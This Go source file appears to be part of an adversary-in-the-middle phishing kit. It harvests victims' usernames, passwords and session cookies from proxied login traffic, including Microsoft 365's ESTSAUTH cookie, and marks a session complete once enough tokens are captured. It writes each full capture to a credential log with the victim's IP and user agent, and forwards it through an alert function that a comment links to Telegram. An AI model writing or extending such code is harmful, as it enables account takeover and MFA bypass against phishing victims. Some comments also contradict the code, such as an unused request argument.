package main

import (
	"fmt"
	"net/http"
	"os"
	"sync"
)

// fileMu serializes appends to the credential log (multiple capture goroutines).
var fileMu sync.Mutex

// MarkDone thread-safely flags the session complete.
func (s *Session) MarkDone() {
	s.mu.Lock()
	s.IsDone = true
	s.mu.Unlock()
}

// ══════════════════════════════════════════════════════════
//  AUTH TOKEN CAPTURE
// ══════════════════════════════════════════════════════════

// ✅ Updated to accept *http.Request so it can pass it down to saveTokens
func captureAuthTokens(resp *http.Response, s *Session, target *Target, r *http.Request) {
	if s == nil {
		return
	}

	capturedAny := false
	cookies := resp.Cookies()
	for _, ck := range cookies {
		if ck.Value == "" {
			continue
		}
		if s.ReachedService || target.AuthTokenNames[ck.Name] {
			s.AddToken(ck.Name, ck.Value) // thread-safe
			capturedAny = true
			fmt.Printf("[+] [%d] [%s] AUTH TOKEN: %s = %s\n",
				s.Index, target.Name, ck.Name, truncate(ck.Value, 40))
		}
	}

	// Consistent snapshot for the completion decision
	username, password, _, tokens, alreadyDone := s.Snapshot()

	if !alreadyDone && isSessionComplete(target, password, s.ReachedService, tokens, capturedAny) {
		s.MarkDone()
		fmt.Printf("\n[!!!] [%d] [%s] SESSION COMPLETE — TOKENS CAPTURED\n", s.Index, target.Name)
		fmt.Printf("[!!!] Username: %s\n", username)
		fmt.Printf("[!!!] Password: %s\n", password)
		fmt.Printf("[!!!] Tokens:   %d cookies captured\n\n", len(tokens))
		
		// ✅ Pass the request context down to saveTokens
		saveTokens(s, target, r)
	}
}

func isSessionComplete(target *Target, password string, reachedService bool, tokens map[string]string, capturedAny bool) bool {
	// Microsoft 365: complete on the ESTSAUTH session cookie.
	if target.Name == "Microsoft 365" {
		_, ok := tokens["ESTSAUTH"]
		return ok
	}

	// Explicit completion cookies take PRECEDENCE
	if len(target.CompletionCookies) > 0 {
		if password == "" {
			return false
		}
		for _, c := range target.CompletionCookies {
			if v, ok := tokens[c]; ok && v != "" && v != "Disabled" {
				return true
			}
		}
		if target.ServiceUpstream != "" {
			return reachedService && capturedAny
		}
		return false
	}

	// Service-upstream targets WITHOUT explicit completion cookies
	if target.ServiceUpstream != "" {
		return password != "" && reachedService && capturedAny
	}

	// Fallback: a captured password is enough.
	return password != ""
}

// ══════════════════════════════════════════════════════════
//  PERSISTENCE + WEBHOOK
// ══════════════════════════════════════════════════════════

// ✅ Updated to accept 3 arguments to match calls from rewrite.go and captureAuthTokens
func saveTokens(s *Session, target *Target, r *http.Request) {
	username, password, campaignID, tokens, _ := s.Snapshot()

	entry := fmt.Sprintf("\n[%s] [%s] SESSION #%d — FULL CAPTURE\n",
		s.CreatedAt.Format("2006-01-02 15:04:05"), target.Name, s.Index)
	entry += fmt.Sprintf("  Campaign: %s\n", campaignID)
	entry += fmt.Sprintf("  Username: %s\n", username)
	entry += fmt.Sprintf("  Password: %s\n", password)
	entry += fmt.Sprintf("  IP:       %s\n", s.IP)
	entry += fmt.Sprintf("  UA:       %s\n", s.UserAgent)
	entry += fmt.Sprintf("  Tokens:\n")
	for name, value := range tokens {
		entry += fmt.Sprintf("    %s = %s\n", name, value)
	}
	entry += "\n"

	appendToFile(credLogFile, entry)

	// ✅ Unconditionally emit the capture since saveTokens is ONLY called when isSessionComplete is true.
	// This passes the *http.Request down to emitCapture so it can read headers for the Telegram alert.
	emitCapture(s, target)
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

func appendToFile(filename, content string) {
	fileMu.Lock()
	defer fileMu.Unlock()
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(content)
}